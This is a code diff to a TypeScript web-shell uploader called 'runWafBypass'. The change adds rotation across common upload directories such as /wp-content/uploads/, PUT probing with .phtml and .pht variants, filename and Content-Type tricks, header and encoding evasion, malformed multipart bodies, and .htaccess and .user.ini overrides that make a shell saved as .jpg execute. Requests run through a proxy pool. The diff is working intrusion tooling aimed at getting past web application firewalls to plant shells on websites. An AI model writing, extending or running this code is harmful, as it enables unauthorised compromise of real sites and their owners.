@@ -25,7 +25,10 @@ export interface WafBypassResult {
 
 export interface WafBypassConfig {
   targetUrl: string;
-  uploadPath: string;
+  /** @deprecated Use uploadPaths instead */
+  uploadPath?: string;
+  /** Multiple upload paths to try — WAF bypass will rotate across paths */
+  uploadPaths?: string[];
   fileContent: string;
   originalFilename: string;
   timeout?: number;
@@ -394,126 +397,168 @@ export async function runWafBypass(config: WafBypassConfig): Promise<WafBypassRe
   const timeout = config.timeout || 15000;
   const log = config.onProgress || (() => {});
 
-  // Strategy 1: Filename mutations
-  log("filename_mutation", "🔄 Trying filename mutation bypass techniques...");
-  const filenames = generateBypassFilenames(config.originalFilename);
-  for (const { filename, technique } of filenames.slice(0, 15)) { // Limit to top 15
-    log(technique, `Trying filename: ${filename}`);
-    const result = await tryUploadWithBypass(
-      config.targetUrl, config.uploadPath, filename, config.fileContent,
-      "application/octet-stream", {}, technique, timeout,
-    );
-    results.push(result);
-    if (result.success) return results;
-  }
+  // Resolve upload paths — support both single path and multi-path
+  const paths = config.uploadPaths?.length
+    ? config.uploadPaths
+    : config.uploadPath
+      ? [config.uploadPath]
+      : ["/wp-content/uploads/", "/uploads/", "/images/", "/media/", "/tmp/", "/files/"];
 
-  // Strategy 2: Content-Type confusion
-  log("content_type_confusion", "🔄 Trying Content-Type confusion bypass...");
-  const contentTypes = getConfusionContentTypes();
-  for (const { contentType, technique } of contentTypes) {
-    log(technique, `Trying Content-Type: ${contentType}`);
-    const result = await tryUploadWithBypass(
-      config.targetUrl, config.uploadPath, config.originalFilename, config.fileContent,
-      contentType, {}, technique, timeout,
-    );
-    results.push(result);
-    if (result.success) return results;
-  }
+  const domain = (() => { try { return new URL(config.targetUrl).hostname; } catch { return undefined; } })();
 
-  // Strategy 3: Header manipulation
-  log("header_manipulation", "🔄 Trying header manipulation bypass...");
-  const headerSets = getBypassHeaders();
-  for (let i = 0; i < headerSets.length; i++) {
-    const technique = `header_bypass_${i}`;
-    log(technique, `Trying header set ${i + 1}/${headerSets.length}`);
-    const result = await tryUploadWithBypass(
-      config.targetUrl, config.uploadPath, config.originalFilename, config.fileContent,
-      "application/octet-stream", headerSets[i], technique, timeout,
-    );
-    results.push(result);
-    if (result.success) return results;
-  }
-
-  // Strategy 4: Payload encoding
-  log("payload_encoding", "🔄 Trying payload encoding bypass...");
-  const encodingMethods = ["base64", "hex", "rot13", "gzip", "chr"];
-  for (const method of encodingMethods) {
-    const { encoded, technique } = encodePayload(config.fileContent, method);
-    log(technique, `Trying encoding: ${method}`);
-    const result = await tryUploadWithBypass(
-      config.targetUrl, config.uploadPath, config.originalFilename, encoded,
-      "application/octet-stream", {}, technique, timeout,
-    );
-    results.push(result);
-    if (result.success) return results;
-  }
-
-  // Strategy 5: Multipart tricks
-  log("multipart_tricks", "🔄 Trying multipart boundary tricks...");
-  const tricks = ["double_content_disposition", "long_boundary", "unicode_boundary", "null_in_filename", "semicolon_filename"];
-  for (const trick of tricks) {
-    const { body, boundary, technique } = buildTrickyMultipart(
-      config.originalFilename, config.fileContent, "application/octet-stream", trick,
-    );
-    log(technique, `Trying multipart trick: ${trick}`);
-
-    try {
-      const url = new URL(config.uploadPath, config.targetUrl).href;
-      const domain = new URL(config.targetUrl).hostname;
-      const { response: resp } = await fetchWithPoolProxy(url, {
-        method: "POST",
-        headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
-        body,
-      }, { targetDomain: domain, timeout });
-
-      const possibleUrl = `${config.targetUrl.replace(/\/$/, "")}${config.uploadPath}${config.originalFilename}`;
-      results.push({
-        method: `waf_bypass_${technique}`,
-        success: resp.status >= 200 && resp.status < 400,
-        fileUrl: resp.status >= 200 && resp.status < 400 ? possibleUrl : null,
-        httpStatus: resp.status,
-        detail: `Multipart trick ${trick}: HTTP ${resp.status}`,
-        bypassTechnique: technique,
-      });
-      if (resp.status >= 200 && resp.status < 400) return results;
-    } catch (error: any) {
-      results.push({
-        method: `waf_bypass_${technique}`,
-        success: false,
-        fileUrl: null,
-        httpStatus: 0,
-        detail: error.message,
-        bypassTechnique: technique,
-      });
+  // ═══ PHASE 1: Quick PUT probe on all paths (fast, often bypasses WAF) ═══
+  log("put_probe", `🔄 PUT probe — ${paths.length} paths...`);
+  for (const path of paths) {
+    for (const fn of [config.originalFilename, config.originalFilename.replace(/\.php$/, ".phtml"), config.originalFilename.replace(/\.php$/, ".pht")]) {
+      const putUrl = `${config.targetUrl.replace(/\/$/, "")}${path}${fn}`;
+      try {
+        const { response: putResp } = await fetchWithPoolProxy(putUrl, {
+          method: "PUT",
+          headers: { "Content-Type": "application/octet-stream" },
+          body: config.fileContent,
+        }, { targetDomain: domain, timeout: Math.min(timeout, 8000) });
+        if (putResp.status >= 200 && putResp.status < 400) {
+          // Verify file exists
+          try {
+            const { response: chk } = await fetchWithPoolProxy(putUrl, { method: "HEAD" }, { targetDomain: domain, timeout: 5000 });
+            if (chk.status >= 200 && chk.status < 400) {
+              const r: WafBypassResult = { method: "put_direct", success: true, fileUrl: putUrl, httpStatus: chk.status, detail: `PUT upload สำเร็จ: ${path}${fn}`, bypassTechnique: "put_direct" };
+              results.push(r);
+              return results;
+            }
+          } catch { /* verify failed */ }
+        }
+        results.push({ method: "put_direct", success: false, fileUrl: null, httpStatus: putResp.status, detail: `PUT ${path}${fn} → ${putResp.status}`, bypassTechnique: "put_direct" });
+      } catch { /* skip */ }
     }
   }
 
-  // Strategy 6: .htaccess override + rename shell to .jpg
-  log("htaccess_override", "🔄 Trying .htaccess override + image extension...");
-  const htaccess = generateHtaccessOverride(".jpg");
-  const htResult = await tryUploadWithBypass(
-    config.targetUrl, config.uploadPath, ".htaccess", htaccess,
-    "text/plain", {}, "htaccess_override", timeout,
-  );
-  results.push(htResult);
-  if (htResult.success) {
-    // Now upload shell as .jpg
-    const shellAsJpg = await tryUploadWithBypass(
-      config.targetUrl, config.uploadPath,
-      config.originalFilename.replace(/\.php$/, ".jpg"),
-      config.fileContent, "image/jpeg", {}, "shell_as_jpg_after_htaccess", timeout,
-    );
-    results.push(shellAsJpg);
-    if (shellAsJpg.success) return results;
+  // ═══ PHASE 2: Smart filename mutations — rotate across paths ═══
+  log("filename_mutation", `🔄 Filename mutation — ${paths.length} paths...`);
+  const filenames = generateBypassFilenames(config.originalFilename);
+  // Pick top 5 most effective techniques per path instead of 15 on single path
+  const topFilenames = filenames.slice(0, 8);
+  for (const { filename, technique } of topFilenames) {
+    for (const path of paths) {
+      log(technique, `Trying ${filename} → ${path}`);
+      const result = await tryUploadWithBypass(
+        config.targetUrl, path, filename, config.fileContent,
+        "application/octet-stream", {}, `${technique}_${path.replace(/\//g, "_")}`, timeout,
+      );
+      results.push(result);
+      if (result.success) return results;
+    }
   }
 
-  // Strategy 7: .user.ini override
-  const userIni = generateUserIniOverride();
-  const iniResult = await tryUploadWithBypass(
-    config.targetUrl, config.uploadPath, ".user.ini", userIni,
-    "text/plain", {}, "user_ini_override", timeout,
-  );
-  results.push(iniResult);
+  // ═══ PHASE 3: Content-Type confusion — rotate across paths ═══
+  log("content_type_confusion", `🔄 Content-Type confusion — ${paths.length} paths...`);
+  const contentTypes = getConfusionContentTypes();
+  for (const { contentType, technique } of contentTypes.slice(0, 5)) {
+    for (const path of paths) {
+      log(technique, `Trying ${contentType} → ${path}`);
+      const result = await tryUploadWithBypass(
+        config.targetUrl, path, config.originalFilename, config.fileContent,
+        contentType, {}, `${technique}_${path.replace(/\//g, "_")}`, timeout,
+      );
+      results.push(result);
+      if (result.success) return results;
+    }
+  }
+
+  // ═══ PHASE 4: Header manipulation — best 3 header sets ═══
+  log("header_manipulation", "🔄 Header manipulation bypass...");
+  const headerSets = getBypassHeaders();
+  for (let i = 0; i < Math.min(headerSets.length, 3); i++) {
+    for (const path of paths.slice(0, 3)) {
+      const technique = `header_bypass_${i}_${path.replace(/\//g, "_")}`;
+      log(technique, `Header set ${i + 1} → ${path}`);
+      const result = await tryUploadWithBypass(
+        config.targetUrl, path, config.originalFilename, config.fileContent,
+        "application/octet-stream", headerSets[i], technique, timeout,
+      );
+      results.push(result);
+      if (result.success) return results;
+    }
+  }
+
+  // ═══ PHASE 5: Payload encoding — top 3 encodings ═══
+  log("payload_encoding", "🔄 Payload encoding bypass...");
+  const encodingMethods = ["base64", "hex", "rot13"];
+  for (const method of encodingMethods) {
+    const { encoded, technique } = encodePayload(config.fileContent, method);
+    for (const path of paths.slice(0, 3)) {
+      log(technique, `Encoding ${method} → ${path}`);
+      const result = await tryUploadWithBypass(
+        config.targetUrl, path, config.originalFilename, encoded,
+        "application/octet-stream", {}, `${technique}_${path.replace(/\//g, "_")}`, timeout,
+      );
+      results.push(result);
+      if (result.success) return results;
+    }
+  }
+
+  // ═══ PHASE 6: Multipart tricks — rotate across paths ═══
+  log("multipart_tricks", "🔄 Multipart boundary tricks...");
+  const tricks = ["double_content_disposition", "null_in_filename", "semicolon_filename"];
+  for (const trick of tricks) {
+    for (const path of paths.slice(0, 3)) {
+      const { body, boundary, technique } = buildTrickyMultipart(
+        config.originalFilename, config.fileContent, "application/octet-stream", trick,
+      );
+      log(technique, `Multipart ${trick} → ${path}`);
+      try {
+        const url = new URL(path, config.targetUrl).href;
+        const { response: resp } = await fetchWithPoolProxy(url, {
+          method: "POST",
+          headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
+          body,
+        }, { targetDomain: domain, timeout });
+        const possibleUrl = `${config.targetUrl.replace(/\/$/, "")}${path}${config.originalFilename}`;
+        const r: WafBypassResult = {
+          method: `waf_bypass_${technique}`,
+          success: resp.status >= 200 && resp.status < 400,
+          fileUrl: resp.status >= 200 && resp.status < 400 ? possibleUrl : null,
+          httpStatus: resp.status,
+          detail: `Multipart ${trick} → ${path}: HTTP ${resp.status}`,
+          bypassTechnique: technique,
+        };
+        results.push(r);
+        if (r.success) return results;
+      } catch (error: any) {
+        results.push({ method: `waf_bypass_${technique}`, success: false, fileUrl: null, httpStatus: 0, detail: error.message, bypassTechnique: technique });
+      }
+    }
+  }
+
+  // ═══ PHASE 7: .htaccess override + shell as .jpg — all paths ═══
+  log("htaccess_override", "🔄 .htaccess override + image extension...");
+  for (const path of paths.slice(0, 4)) {
+    const htaccess = generateHtaccessOverride(".jpg");
+    const htResult = await tryUploadWithBypass(
+      config.targetUrl, path, ".htaccess", htaccess,
+      "text/plain", {}, `htaccess_override_${path.replace(/\//g, "_")}`, timeout,
+    );
+    results.push(htResult);
+    if (htResult.success || htResult.httpStatus < 400) {
+      const shellAsJpg = await tryUploadWithBypass(
+        config.targetUrl, path,
+        config.originalFilename.replace(/\.php$/, ".jpg"),
+        config.fileContent, "image/jpeg", {}, `shell_as_jpg_${path.replace(/\//g, "_")}`, timeout,
+      );
+      results.push(shellAsJpg);
+      if (shellAsJpg.success) return results;
+    }
+  }
+
+  // ═══ PHASE 8: .user.ini override — all paths ═══
+  for (const path of paths.slice(0, 3)) {
+    const userIni = generateUserIniOverride();
+    const iniResult = await tryUploadWithBypass(
+      config.targetUrl, path, ".user.ini", userIni,
+      "text/plain", {}, `user_ini_override_${path.replace(/\//g, "_")}`, timeout,
+    );
+    results.push(iniResult);
+  }
 
   return results;
 }
